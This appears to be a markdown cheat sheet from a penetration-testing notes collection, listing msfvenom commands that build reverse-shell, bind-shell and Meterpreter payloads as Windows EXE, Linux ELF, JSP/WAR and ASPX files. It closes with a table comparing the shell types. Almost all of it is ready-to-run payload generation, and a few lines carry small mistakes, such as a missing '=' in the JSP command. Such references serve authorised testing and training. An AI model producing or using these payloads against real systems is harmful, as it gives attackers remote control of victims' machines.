# msfvenom

```
Description: Payload generator tool included with Metasploit Framework
It's used to create custom shellcode or backdoor executables for exploiting systems

msfvenom -h

Windows Binary (.exe) 32 Bit (x86)
    # Reverse Shell
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

    # Bind Shell
    msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

    # Output in Hex, C Style, Exclude bad chars, Exitfunction thread
    msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

Windows Binary (.exe) 64 Bit (x64)
    # Reverse Shell
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

    # Bind Shell
    msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe

    # Meterpreter
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe

Linux Binary (.elf) 32 Bit (x86)
    # Reverse Shell
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

    # Bind Shell
    msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf

Linux Binary (.elf) 64 Bit (x64)
    # Reverse Shell
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf

    # Bind Shell
    msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf

Java Server Pages (.jsp)
    msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp

    # As .war
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war

Active Sever Pages Extended (.aspx)
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```

| **Type**         | **Connection Direction** | **Use Case**                         | **Pros**                                          | **Cons**                                       |
|------------------|--------------------------|--------------------------------------|---------------------------------------------------|------------------------------------------------|
| **Reverse Shell** | Victim → Attacker         | When victim is behind NAT/firewall   | Easy to bypass firewalls; attacker controls port | Requires attacker to listen; needs outbound allowed |
| **Bind Shell**    | Attacker → Victim         | When victim can accept connections   | Simple setup on victim                          | Blocked by firewalls; attacker needs access    |
| **Meterpreter**   | Victim → Attacker         | Post-exploitation (Metasploit shell) | Powerful, stealthy, in-memory, many built-ins    | May trigger antivirus; requires exploit setup  |

## Back to README.md
[BACK](../README.md)